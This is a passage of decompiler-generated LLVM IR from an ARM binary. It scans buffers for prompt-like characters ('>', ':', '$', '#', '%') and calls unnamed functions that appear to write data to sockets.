dec_label_pc_f874:                                ; preds = %.thread98, %.thread99.dec_label_pc_f874thread-pre-split_crit_edge
  %v0_f874.pr = phi i32 [ %v0_f874.pr.pre, %.thread99.dec_label_pc_f874thread-pre-split_crit_edge ], [ %v4_f860, %.thread98 ]
  %v2_f874 = icmp ugt i32 %v0_f874.pr, 250
  store i1 %v2_f874, i1* %cpsr_c.global-to-local, align 1
  %v7_f874 = icmp eq i32 %v0_f874.pr, 251
  store i1 %v7_f874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f874, label %bb437, label %.thread102

bb437:                                            ; preds = %dec_label_pc_f874
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f87c = load i32, i32* @r4, align 4
  %v4_f87c = add i32 %v3_f87c, 2
  %v5_f87c = inttoptr i32 %v4_f87c to i8*
  store i8 -3, i8* %v5_f87c, align 1
  br label %.thread102

.thread102:                                       ; preds = %dec_label_pc_f874, %.thread99, %bb437
  %v0_f880 = load i32, i32* @r6, align 4
  %v1_f880 = add i32 %v0_f880, 4
  %v2_f880 = inttoptr i32 %v1_f880 to i32*
  %v3_f880 = load i32, i32* %v2_f880, align 4
  store i32 %v3_f880, i32* %r0.global-to-local, align 4
  %v0_f884 = load i32, i32* @r4, align 4
  br label %dec_label_pc_f88c

dec_label_pc_f88c:                                ; preds = %dec_label_pc_ffa4, %.thread102
  %v0_f890 = phi i32 [ %v3_ffb8, %dec_label_pc_ffa4 ], [ %v3_f880, %.thread102 ]
  %storemerge3 = phi i32 [ %v2_fea8, %dec_label_pc_ffa4 ], [ %v0_f884, %.thread102 ]
  %storemerge2 = phi i32 [ 9, %dec_label_pc_ffa4 ], [ 3, %.thread102 ]
  store i32 %storemerge3, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* @r3, align 4
  %v4_f890 = call i32 @function_11a30(i32 %v0_f890, i32 %storemerge3, i32 %storemerge2, i32 16384)
  store i32 %v4_f890, i32* %r0.global-to-local, align 4
  %v0_f894 = load i32, i32* @r6, align 4
  %v1_f894 = add i32 %v0_f894, 24
  %v2_f894 = inttoptr i32 %v1_f894 to i32*
  %v3_f894 = load i32, i32* %v2_f894, align 4
  store i32 %v3_f894, i32* %r1.global-to-local, align 4
  %v0_f898 = load i32, i32* @r8, align 4
  %v1_f898 = add i32 %v0_f898, 3
  store i32 %v1_f898, i32* @r8, align 4
  %v3_f89c = icmp uge i32 %v1_f898, %v3_f894
  store i1 %v3_f89c, i1* %cpsr_c.global-to-local, align 1
  %v9_f89c = icmp eq i32 %v1_f898, %v3_f894
  store i1 %v9_f89c, i1* %cpsr_z.global-to-local, align 1
  %v0_f8a0 = load i32, i32* @r4, align 4
  %v1_f8a0 = add i32 %v0_f8a0, 3
  store i32 %v1_f8a0, i32* @r4, align 4
  %v5_f8a4 = icmp slt i32 %v1_f898, %v3_f894
  br i1 %v5_f8a4, label %dec_label_pc_f7fc, label %dec_label_pc_f8a8

dec_label_pc_f8a8:                                ; preds = %dec_label_pc_f7f4.loopexit, %dec_label_pc_f7fc, %dec_label_pc_f88c, %dec_label_pc_f834, %dec_label_pc_f808, %dec_label_pc_f7e8, %dec_label_pc_fe90.dec_label_pc_f8a8.loopexit_crit_edge
  %v6_f8b0 = phi i32 [ %v0_fec0, %dec_label_pc_fe90.dec_label_pc_f8a8.loopexit_crit_edge ], [ %v0_f4fc, %dec_label_pc_f7e8 ], [ %v6_f8b0278, %dec_label_pc_f7fc ], [ %v0_f894, %dec_label_pc_f88c ], [ %v6_f8b0278, %dec_label_pc_f834 ], [ %v6_f8b0278, %dec_label_pc_f808 ], [ %v6_f8b0278, %dec_label_pc_f7f4.loopexit ]
  %v0_f8a8 = phi i32 [ %v0_f8a8.pre.pre, %dec_label_pc_fe90.dec_label_pc_f8a8.loopexit_crit_edge ], [ 0, %dec_label_pc_f7e8 ], [ %v1_f824, %dec_label_pc_f7fc ], [ %v1_f898, %dec_label_pc_f88c ], [ %v1_f824, %dec_label_pc_f834 ], [ %v1_f824, %dec_label_pc_f808 ], [ %v2_f824, %dec_label_pc_f7f4.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8a8 = icmp eq i32 %v0_f8a8, 0
  store i1 %v2_f8a8, i1* %cpsr_z.global-to-local, align 1
  %tmp438 = icmp slt i32 %v0_f8a8, 1
  br i1 %tmp438, label %dec_label_pc_f6e4, label %bb439

bb439:                                            ; preds = %dec_label_pc_f8a8
  store i32 3, i32* @r3, align 4
  %v7_f8b0 = add i32 %v6_f8b0, 12
  %v8_f8b0 = inttoptr i32 %v7_f8b0 to i32*
  store i32 3, i32* %v8_f8b0, align 4
  br label %dec_label_pc_f6e4

dec_label_pc_f8b8:                                ; preds = %dec_label_pc_f4fc
  %v1_f8b8 = add i32 %v0_f4fc, 24
  %v2_f8b8 = inttoptr i32 %v1_f8b8 to i32*
  %v3_f8b8 = load i32, i32* %v2_f8b8, align 4
  store i32 %v3_f8b8, i32* %r2.global-to-local, align 4
  %v1_f8bc = add i32 %v3_f8b8, -1
  store i32 %v1_f8bc, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8c0 = icmp eq i32 %v1_f8bc, 0
  store i1 %v2_f8c0, i1* %cpsr_z.global-to-local, align 1
  %tmp440 = icmp slt i32 %v1_f8bc, 1
  br i1 %tmp440, label %dec_label_pc_f47c.backedge.thread, label %dec_label_pc_f8c8

dec_label_pc_f8c8:                                ; preds = %dec_label_pc_f8b8
  %v2_f8c8 = add i32 %v1_f8bc, %v0_f4fc
  store i32 %v2_f8c8, i32* %r3.global-to-local, align 4
  %v1_f8cc = add i32 %v2_f8c8, 28
  %v2_f8cc = inttoptr i32 %v1_f8cc to i8*
  %v3_f8cc = load i8, i8* %v2_f8cc, align 1
  %v4_f8cc = zext i8 %v3_f8cc to i32
  store i32 %v4_f8cc, i32* %r3.global-to-local, align 4
  %v2_f8d0 = icmp ugt i8 %v3_f8cc, 61
  store i1 %v2_f8d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f8d0 = icmp eq i8 %v3_f8cc, 62
  store i1 %v7_f8d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8d0, label %dec_label_pc_f934, label %bb441

bb441:                                            ; preds = %dec_label_pc_f8c8
  %v3_f8d4 = icmp ugt i8 %v3_f8cc, 57
  store i1 %v3_f8d4, i1* %cpsr_c.global-to-local, align 1
  %v8_f8d4 = icmp eq i8 %v3_f8cc, 58
  store i1 %v8_f8d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f8d4, label %dec_label_pc_f934, label %dec_label_pc_f8dc

dec_label_pc_f8dc:                                ; preds = %bb441
  %v2_f8dc = icmp ugt i8 %v3_f8cc, 35
  store i1 %v2_f8dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f8dc = icmp eq i8 %v3_f8cc, 36
  store i1 %v7_f8dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8dc, label %dec_label_pc_f934, label %dec_label_pc_f8e4

dec_label_pc_f8e4:                                ; preds = %dec_label_pc_f8dc
  %v2_f8e4 = icmp ugt i8 %v3_f8cc, 34
  store i1 %v2_f8e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f8e4 = icmp eq i8 %v3_f8cc, 35
  store i1 %v7_f8e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8e4, label %dec_label_pc_f934, label %dec_label_pc_f8ec

dec_label_pc_f8ec:                                ; preds = %dec_label_pc_f8e4
  %v2_f8ec = icmp ugt i8 %v3_f8cc, 36
  store i1 %v2_f8ec, i1* %cpsr_c.global-to-local, align 1
  %v7_f8ec = icmp eq i8 %v3_f8cc, 37
  store i1 %v7_f8ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8ec, label %dec_label_pc_f934, label %dec_label_pc_f91c.preheader

dec_label_pc_f91c.preheader:                      ; preds = %dec_label_pc_f8ec
  %v3_f8f0 = add i32 %v0_f4fc, 28
  %v2_f8f4 = add i32 %v3_f8f0, %v3_f8b8
  store i32 %v2_f8f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f91c

dec_label_pc_f900:                                ; preds = %bb442
  %v2_f900 = icmp ugt i8 %v3_f924, 35
  store i1 %v2_f900, i1* %cpsr_c.global-to-local, align 1
  %v7_f900 = icmp eq i8 %v3_f924, 36
  store i1 %v7_f900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f900, label %dec_label_pc_f934, label %dec_label_pc_f908

dec_label_pc_f908:                                ; preds = %dec_label_pc_f900
  %v2_f908 = icmp ugt i8 %v3_f924, 34
  store i1 %v2_f908, i1* %cpsr_c.global-to-local, align 1
  %v7_f908 = icmp eq i8 %v3_f924, 35
  store i1 %v7_f908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f908, label %dec_label_pc_f934, label %dec_label_pc_f910

dec_label_pc_f910:                                ; preds = %dec_label_pc_f908
  %v2_f910 = icmp ugt i8 %v3_f924, 36
  store i1 %v2_f910, i1* %cpsr_c.global-to-local, align 1
  %v7_f910 = icmp eq i8 %v3_f924, 37
  store i1 %v7_f910, i1* %cpsr_z.global-to-local, align 1
  %v1_f914 = add i32 %v0_f914, -1
  store i32 %v1_f914, i32* %r3.global-to-local, align 4
  br i1 %v7_f910, label %dec_label_pc_f934, label %dec_label_pc_f91c

dec_label_pc_f91c:                                ; preds = %dec_label_pc_f91c.preheader, %dec_label_pc_f910
  %v0_f914 = phi i32 [ %v2_f8f4, %dec_label_pc_f91c.preheader ], [ %v1_f914, %dec_label_pc_f910 ]
  %v0_f91c = phi i32 [ %v1_f8bc, %dec_label_pc_f91c.preheader ], [ %v1_f91c, %dec_label_pc_f910 ]
  %v1_f91c = add i32 %v0_f91c, -1
  store i32 %v1_f91c, i32* %r1.global-to-local, align 4
  %v2_f91c = icmp ne i32 %v0_f91c, 0
  store i1 %v2_f91c, i1* %cpsr_c.global-to-local, align 1
  %v7_f91c = icmp eq i32 %v0_f91c, 1
  store i1 %v7_f91c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f91c, label %dec_label_pc_f47c.backedge.thread565, label %dec_label_pc_f924

dec_label_pc_f924:                                ; preds = %dec_label_pc_f91c
  %v1_f924 = add i32 %v0_f914, -2
  %v2_f924 = inttoptr i32 %v1_f924 to i8*
  %v3_f924 = load i8, i8* %v2_f924, align 1
  %v4_f924 = zext i8 %v3_f924 to i32
  store i32 %v4_f924, i32* %r2.global-to-local, align 4
  %v2_f928 = icmp ugt i8 %v3_f924, 61
  store i1 %v2_f928, i1* %cpsr_c.global-to-local, align 1
  %v7_f928 = icmp eq i8 %v3_f924, 62
  store i1 %v7_f928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f928, label %dec_label_pc_f934, label %bb442

bb442:                                            ; preds = %dec_label_pc_f924
  %v3_f92c = icmp ugt i8 %v3_f924, 57
  store i1 %v3_f92c, i1* %cpsr_c.global-to-local, align 1
  %v8_f92c = icmp eq i8 %v3_f924, 58
  store i1 %v8_f92c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f92c, label %dec_label_pc_f934, label %dec_label_pc_f900

dec_label_pc_f934:                                ; preds = %dec_label_pc_f924, %bb442, %dec_label_pc_f910, %dec_label_pc_f908, %dec_label_pc_f900, %dec_label_pc_f8ec, %dec_label_pc_f8c8, %dec_label_pc_f8e4, %dec_label_pc_f8dc, %bb441
  %v0_f938 = phi i32 [ %v1_f8bc, %dec_label_pc_f8ec ], [ %v1_f8bc, %dec_label_pc_f8c8 ], [ %v1_f8bc, %dec_label_pc_f8e4 ], [ %v1_f8bc, %dec_label_pc_f8dc ], [ %v1_f8bc, %bb441 ], [ %v1_f91c, %dec_label_pc_f900 ], [ %v1_f91c, %dec_label_pc_f908 ], [ %v1_f91c, %dec_label_pc_f910 ], [ %v1_f91c, %bb442 ], [ %v1_f91c, %dec_label_pc_f924 ]
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f938 = add i32 %v0_f938, 1
  store i32 %v1_f938, i32* @r8, align 4
  %v1_f93c = call i32 @function_1030c(i32 6)
  store i32 %v2_fe00, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_f94c = call i32 @function_10248(i32 6, i32* nonnull %stack_var_-60)
  store i32 %v3_f94c, i32* %r0.global-to-local, align 4
  %v3_f950 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f950, i32* %r2.global-to-local, align 4
  store i32 %v3_f94c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f95c = load i32, i32* @r6, align 4
  %v1_f95c = add i32 %v0_f95c, 4
  %v2_f95c = inttoptr i32 %v1_f95c to i32*
  %v3_f95c = load i32, i32* %v2_f95c, align 4
  store i32 %v3_f95c, i32* %r0.global-to-local, align 4
  %v4_f960 = call i32 @function_11a30(i32 %v3_f95c, i32 %v3_f94c, i32 %v3_f950, i32 16384)
  store i32 %v4_f960, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1673c.190 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f970 = load i32, i32* @r6, align 4
  %v1_f970 = add i32 %v0_f970, 4
  %v2_f970 = inttoptr i32 %v1_f970 to i32*
  %v3_f970 = load i32, i32* %v2_f970, align 4
  store i32 %v3_f970, i32* %r0.global-to-local, align 4
  %v4_f974 = call i32 @function_11a30(i32 %v3_f970, i32 ptrtoint ([3 x i8]* @global_var_1673c.190 to i32), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f97c = call i32 @function_1026c(i32 6)
  store i32 %v1_f97c, i32* %r0.global-to-local, align 4
  store i32 7, i32* @r3, align 4
  %v1_f984 = load i32, i32* @r6, align 4
  %v2_f984 = add i32 %v1_f984, 12
  %v3_f984 = inttoptr i32 %v2_f984 to i32*
  store i32 7, i32* %v3_f984, align 4
  br label %dec_label_pc_f6ec

dec_label_pc_f98c:                                ; preds = %dec_label_pc_f4fc
  %v1_f98c = add i32 %v0_f4fc, 24
  %v2_f98c = inttoptr i32 %v1_f98c to i32*
  %v3_f98c = load i32, i32* %v2_f98c, align 4
  store i32 %v3_f98c, i32* %r2.global-to-local, align 4
  %v1_f990 = add i32 %v3_f98c, -1
  store i32 %v1_f990, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f994 = icmp eq i32 %v1_f990, 0
  store i1 %v2_f994, i1* %cpsr_z.global-to-local, align 1
  %tmp443 = icmp slt i32 %v1_f990, 1
  br i1 %tmp443, label %dec_label_pc_f47c.backedge.thread, label %dec_label_pc_f99c

dec_label_pc_f99c:                                ; preds = %dec_label_pc_f98c
  %v2_f99c = add i32 %v1_f990, %v0_f4fc
  store i32 %v2_f99c, i32* %r3.global-to-local, align 4
  %v1_f9a0 = add i32 %v2_f99c, 28
  %v2_f9a0 = inttoptr i32 %v1_f9a0 to i8*
  %v3_f9a0 = load i8, i8* %v2_f9a0, align 1
  %v4_f9a0 = zext i8 %v3_f9a0 to i32
  store i32 %v4_f9a0, i32* %r3.global-to-local, align 4
  %v2_f9a4 = icmp ugt i8 %v3_f9a0, 61
  store i1 %v2_f9a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f9a4 = icmp eq i8 %v3_f9a0, 62
  store i1 %v7_f9a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9a4, label %dec_label_pc_fa08, label %bb444

bb444:                                            ; preds = %dec_label_pc_f99c
  %v3_f9a8 = icmp ugt i8 %v3_f9a0, 57
  store i1 %v3_f9a8, i1* %cpsr_c.global-to-local, align 1
  %v8_f9a8 = icmp eq i8 %v3_f9a0, 58
  store i1 %v8_f9a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f9a8, label %dec_label_pc_fa08, label %dec_label_pc_f9b0

dec_label_pc_f9b0:                                ; preds = %bb444
  %v2_f9b0 = icmp ugt i8 %v3_f9a0, 35
  store i1 %v2_f9b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f9b0 = icmp eq i8 %v3_f9a0, 36
  store i1 %v7_f9b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9b0, label %dec_label_pc_fa08, label %dec_label_pc_f9b8

dec_label_pc_f9b8:                                ; preds = %dec_label_pc_f9b0
  %v2_f9b8 = icmp ugt i8 %v3_f9a0, 34
  store i1 %v2_f9b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f9b8 = icmp eq i8 %v3_f9a0, 35
  store i1 %v7_f9b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9b8, label %dec_label_pc_fa08, label %dec_label_pc_f9c0

dec_label_pc_f9c0:                                ; preds = %dec_label_pc_f9b8
  %v2_f9c0 = icmp ugt i8 %v3_f9a0, 36
  store i1 %v2_f9c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f9c0 = icmp eq i8 %v3_f9a0, 37
  store i1 %v7_f9c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9c0, label %dec_label_pc_fa08, label %dec_label_pc_f9f0.preheader

dec_label_pc_f9f0.preheader:                      ; preds = %dec_label_pc_f9c0
  %v3_f9c4 = add i32 %v0_f4fc, 28
  %v2_f9c8 = add i32 %v3_f9c4, %v3_f98c
  store i32 %v2_f9c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f9f0

dec_label_pc_f9d4:                                ; preds = %bb445
  %v2_f9d4 = icmp ugt i8 %v3_f9f8, 35
  store i1 %v2_f9d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f9d4 = icmp eq i8 %v3_f9f8, 36
  store i1 %v7_f9d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9d4, label %dec_label_pc_fa08, label %dec_label_pc_f9dc

dec_label_pc_f9dc:                                ; preds = %dec_label_pc_f9d4
  %v2_f9dc = icmp ugt i8 %v3_f9f8, 34
  store i1 %v2_f9dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f9dc = icmp eq i8 %v3_f9f8, 35
  store i1 %v7_f9dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9dc, label %dec_label_pc_fa08, label %dec_label_pc_f9e4

dec_label_pc_f9e4:                                ; preds = %dec_label_pc_f9dc
  %v2_f9e4 = icmp ugt i8 %v3_f9f8, 36
  store i1 %v2_f9e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f9e4 = icmp eq i8 %v3_f9f8, 37
  store i1 %v7_f9e4, i1* %cpsr_z.global-to-local, align 1
  %v1_f9e8 = add i32 %v0_f9e8, -1
  store i32 %v1_f9e8, i32* %r3.global-to-local, align 4
  br i1 %v7_f9e4, label %dec_label_pc_fa08, label %dec_label_pc_f9f0

dec_label_pc_f9f0:                                ; preds = %dec_label_pc_f9f0.preheader, %dec_label_pc_f9e4
  %v0_f9e8 = phi i32 [ %v2_f9c8, %dec_label_pc_f9f0.preheader ], [ %v1_f9e8, %dec_label_pc_f9e4 ]
  %v0_f9f0 = phi i32 [ %v1_f990, %dec_label_pc_f9f0.preheader ], [ %v1_f9f0, %dec_label_pc_f9e4 ]
  %v1_f9f0 = add i32 %v0_f9f0, -1
  store i32 %v1_f9f0, i32* %r1.global-to-local, align 4
  %v2_f9f0 = icmp ne i32 %v0_f9f0, 0
  store i1 %v2_f9f0, i1* %cpsr_c.global-to-local, align 1
  %v7_f9f0 = icmp eq i32 %v0_f9f0, 1
  store i1 %v7_f9f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9f0, label %dec_label_pc_f47c.backedge.thread565, label %dec_label_pc_f9f8

dec_label_pc_f9f8:                                ; preds = %dec_label_pc_f9f0
  %v1_f9f8 = add i32 %v0_f9e8, -2
  %v2_f9f8 = inttoptr i32 %v1_f9f8 to i8*
  %v3_f9f8 = load i8, i8* %v2_f9f8, align 1
  %v4_f9f8 = zext i8 %v3_f9f8 to i32
  store i32 %v4_f9f8, i32* %r2.global-to-local, align 4
  %v2_f9fc = icmp ugt i8 %v3_f9f8, 61
  store i1 %v2_f9fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f9fc = icmp eq i8 %v3_f9f8, 62
  store i1 %v7_f9fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9fc, label %dec_label_pc_fa08, label %bb445

bb445:                                            ; preds = %dec_label_pc_f9f8
  %v3_fa00 = icmp ugt i8 %v3_f9f8, 57
  store i1 %v3_fa00, i1* %cpsr_c.global-to-local, align 1
  %v8_fa00 = icmp eq i8 %v3_f9f8, 58
  store i1 %v8_fa00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fa00, label %dec_label_pc_fa08, label %dec_label_pc_f9d4

dec_label_pc_fa08:                                ; preds = %dec_label_pc_f9f8, %bb445, %dec_label_pc_f9e4, %dec_label_pc_f9dc, %dec_label_pc_f9d4, %dec_label_pc_f9c0, %dec_label_pc_f99c, %dec_label_pc_f9b8, %dec_label_pc_f9b0, %bb444
  %v0_fa0c = phi i32 [ %v1_f990, %dec_label_pc_f9c0 ], [ %v1_f990, %dec_label_pc_f99c ], [ %v1_f990, %dec_label_pc_f9b8 ], [ %v1_f990, %dec_label_pc_f9b0 ], [ %v1_f990, %bb444 ], [ %v1_f9f0, %dec_label_pc_f9d4 ], [ %v1_f9f0, %dec_label_pc_f9dc ], [ %v1_f9f0, %dec_label_pc_f9e4 ], [ %v1_f9f0, %bb445 ], [ %v1_f9f0, %dec_label_pc_f9f8 ]
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_fa0c = add i32 %v0_fa0c, 1
  store i32 %v1_fa0c, i32* @r8, align 4
  %v1_fa10 = call i32 @function_1030c(i32 5)
  store i32 %v2_fe00, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v3_fa20 = call i32 @function_10248(i32 5, i32* nonnull %stack_var_-60)
  store i32 %v3_fa20, i32* %r0.global-to-local, align 4
  %v3_fa24 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fa24, i32* %r2.global-to-local, align 4
  store i32 %v3_fa20, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fa30 = load i32, i32* @r6, align 4
  %v1_fa30 = add i32 %v0_fa30, 4
  %v2_fa30 = inttoptr i32 %v1_fa30 to i32*
  %v3_fa30 = load i32, i32* %v2_fa30, align 4
  store i32 %v3_fa30, i32* %r0.global-to-local, align 4
  %v4_fa34 = call i32 @function_11a30(i32 %v3_fa30, i32 %v3_fa20, i32 %v3_fa24, i32 16384)
  store i32 %v4_fa34, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1673c.190 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fa44 = load i32, i32* @r6, align 4
  %v1_fa44 = add i32 %v0_fa44, 4
  %v2_fa44 = inttoptr i32 %v1_fa44 to i32*
  %v3_fa44 = load i32, i32* %v2_fa44, align 4
  store i32 %v3_fa44, i32* %r0.global-to-local, align 4
  %v4_fa48 = call i32 @function_11a30(i32 %v3_fa44, i32 ptrtoint ([3 x i8]* @global_var_1673c.190 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_fa50 = call i32 @function_1026c(i32 5)
  store i32 %v1_fa50, i32* %r0.global-to-local, align 4
  store i32 6, i32* @r3, align 4
  %v1_fa58 = load i32, i32* @r6, align 4
  %v2_fa58 = add i32 %v1_fa58, 12
  %v3_fa58 = inttoptr i32 %v2_fa58 to i32*
  store i32 6, i32* %v3_fa58, align 4
  br label %dec_label_pc_f6ec

dec_label_pc_fadc:                                ; preds = %dec_label_pc_f4fc
  %v1_fadc = add i32 %v0_f4fc, 24
  %v2_fadc = inttoptr i32 %v1_fadc to i32*
  %v3_fadc = load i32, i32* %v2_fadc, align 4
  store i32 %v3_fadc, i32* %r2.global-to-local, align 4
  %v1_fae0 = add i32 %v3_fadc, -1
  store i32 %v1_fae0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fae4 = icmp eq i32 %v1_fae0, 0
  store i1 %v2_fae4, i1* %cpsr_z.global-to-local, align 1
  %tmp446 = icmp slt i32 %v1_fae0, 1
  br i1 %tmp446, label %dec_label_pc_f47c.backedge.thread, label %dec_label_pc_faec

dec_label_pc_faec:                                ; preds = %dec_label_pc_fadc
  %v2_faec = add i32 %v1_fae0, %v0_f4fc
  store i32 %v2_faec, i32* %r3.global-to-local, align 4
  %v1_faf0 = add i32 %v2_faec, 28
  %v2_faf0 = inttoptr i32 %v1_faf0 to i8*
  %v3_faf0 = load i8, i8* %v2_faf0, align 1
  %v4_faf0 = zext i8 %v3_faf0 to i32
  store i32 %v4_faf0, i32* %r3.global-to-local, align 4
  %v2_faf4 = icmp ugt i8 %v3_faf0, 61
  store i1 %v2_faf4, i1* %cpsr_c.global-to-local, align 1
  %v7_faf4 = icmp eq i8 %v3_faf0, 62
  store i1 %v7_faf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_faf4, label %dec_label_pc_fb58, label %bb447

bb447:                                            ; preds = %dec_label_pc_faec
  %v3_faf8 = icmp ugt i8 %v3_faf0, 57
  store i1 %v3_faf8, i1* %cpsr_c.global-to-local, align 1
  %v8_faf8 = icmp eq i8 %v3_faf0, 58
  store i1 %v8_faf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_faf8, label %dec_label_pc_fb58, label %dec_label_pc_fb00

dec_label_pc_fb00:                                ; preds = %bb447
  %v2_fb00 = icmp ugt i8 %v3_faf0, 35
  store i1 %v2_fb00, i1* %cpsr_c.global-to-local, align 1
  %v7_fb00 = icmp eq i8 %v3_faf0, 36
  store i1 %v7_fb00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb00, label %dec_label_pc_fb58, label %dec_label_pc_fb08

dec_label_pc_fb08:                                ; preds = %dec_label_pc_fb00
  %v2_fb08 = icmp ugt i8 %v3_faf0, 34
  store i1 %v2_fb08, i1* %cpsr_c.global-to-local, align 1
  %v7_fb08 = icmp eq i8 %v3_faf0, 35
  store i1 %v7_fb08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb08, label %dec_label_pc_fb58, label %dec_label_pc_fb10

dec_label_pc_fb10:                                ; preds = %dec_label_pc_fb08
  %v2_fb10 = icmp ugt i8 %v3_faf0, 36
  store i1 %v2_fb10, i1* %cpsr_c.global-to-local, align 1
  %v7_fb10 = icmp eq i8 %v3_faf0, 37
  store i1 %v7_fb10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb10, label %dec_label_pc_fb58, label %dec_label_pc_fb40.preheader

dec_label_pc_fb40.preheader:                      ; preds = %dec_label_pc_fb10
  %v3_fb14 = add i32 %v0_f4fc, 28
  %v2_fb18 = add i32 %v3_fb14, %v3_fadc
  store i32 %v2_fb18, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fb40

dec_label_pc_fb24:                                ; preds = %bb448
  %v2_fb24 = icmp ugt i8 %v3_fb48, 35
  store i1 %v2_fb24, i1* %cpsr_c.global-to-local, align 1
  %v7_fb24 = icmp eq i8 %v3_fb48, 36
  store i1 %v7_fb24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb24, label %dec_label_pc_fb58, label %dec_label_pc_fb2c

dec_label_pc_fb2c:                                ; preds = %dec_label_pc_fb24
  %v2_fb2c = icmp ugt i8 %v3_fb48, 34
  store i1 %v2_fb2c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb2c = icmp eq i8 %v3_fb48, 35
  store i1 %v7_fb2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb2c, label %dec_label_pc_fb58, label %dec_label_pc_fb34

dec_label_pc_fb34:                                ; preds = %dec_label_pc_fb2c
  %v2_fb34 = icmp ugt i8 %v3_fb48, 36
  store i1 %v2_fb34, i1* %cpsr_c.global-to-local, align 1
  %v7_fb34 = icmp eq i8 %v3_fb48, 37
  store i1 %v7_fb34, i1* %cpsr_z.global-to-local, align 1
  %v1_fb38 = add i32 %v0_fb38, -1
  store i32 %v1_fb38, i32* %r3.global-to-local, align 4
  br i1 %v7_fb34, label %dec_label_pc_fb58, label %dec_label_pc_fb40

dec_label_pc_fb40:                                ; preds = %dec_label_pc_fb40.preheader, %dec_label_pc_fb34
  %v0_fb38 = phi i32 [ %v2_fb18, %dec_label_pc_fb40.preheader ], [ %v1_fb38, %dec_label_pc_fb34 ]
  %v0_fb40 = phi i32 [ %v1_fae0, %dec_label_pc_fb40.preheader ], [ %v1_fb40, %dec_label_pc_fb34 ]
  %v1_fb40 = add i32 %v0_fb40, -1
  store i32 %v1_fb40, i32* %r1.global-to-local, align 4
  %v2_fb40 = icmp ne i32 %v0_fb40, 0
  store i1 %v2_fb40, i1* %cpsr_c.global-to-local, align 1
  %v7_fb40 = icmp eq i32 %v0_fb40, 1
  store i1 %v7_fb40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb40, label %dec_label_pc_f47c.backedge.thread565, label %dec_label_pc_fb48

dec_label_pc_fb48:                                ; preds = %dec_label_pc_fb40
  %v1_fb48 = add i32 %v0_fb38, -2
  %v2_fb48 = inttoptr i32 %v1_fb48 to i8*
  %v3_fb48 = load i8, i8* %v2_fb48, align 1
  %v4_fb48 = zext i8 %v3_fb48 to i32
  store i32 %v4_fb48, i32* %r2.global-to-local, align 4
  %v2_fb4c = icmp ugt i8 %v3_fb48, 61
